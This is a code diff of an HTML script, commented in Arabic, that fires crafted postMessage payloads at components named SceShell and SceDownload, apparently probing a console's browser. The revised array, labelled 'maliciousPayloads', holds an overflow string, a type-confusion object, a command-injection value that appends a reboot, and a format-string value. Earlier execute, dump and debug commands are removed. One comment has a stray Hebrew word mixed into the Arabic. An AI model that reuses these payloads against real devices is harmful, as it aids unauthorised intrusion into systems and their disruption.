@@ -1,22 +1,21 @@
 <script>
-    // الاستماع لأي ردود معقدة من النظام
     window.addEventListener('message', (event) => {
-        console.log("RAW SYSTEM RESPONSE:", event.data);
-        alert("System Full Response: " + JSON.stringify(event.data));
+        alert("RESPONSE: " + JSON.stringify(event.data));
     });
 
-    // إرسال أوامر "مستهدفة" (Targeted Commands)
-    // سنحاول التلاعب بالحالة (state) أو طلب تنفيذ (execute)
-    const payloads = [
-        {cmd: 'execute', action: 'get_version', target: 'SceShell'},
-        {cmd: 'dump', target: 'SceDownload', path: '/dev/null'}, // اختبار المسارات
-        {cmd: 'set_debug', mode: 'true', target: 'SceShell'}   // اختبار تفعيل وضع التصحيح
+    const maliciousPayloads = [
+        // 1. اختبار الحجم (Buffer Overflow)
+        {cmd: 'a'.repeat(10000), target: 'SceShell'},
+        // 2. اختبار القيم غير المتوقعة (Type Confusion)
+        {cmd: null, target: 12345},
+        // 3. اختبار الحقن (Injection Attempt)
+        {cmd: 'status; reboot;', target: 'SceShell'},
+        // 4. اختبار الـ Format String (אם ممكن)
+        {cmd: '%s%s%s%s%n', target: 'SceShell'}
     ];
 
-    payloads.forEach(p => {
-        try {
-            window.postMessage(p, '*');
-            console.log("Sent Payload: ", p);
-        } catch(e) {}
+    maliciousPayloads.forEach(p => {
+        window.postMessage(p, '*');
     });
 </script>
+
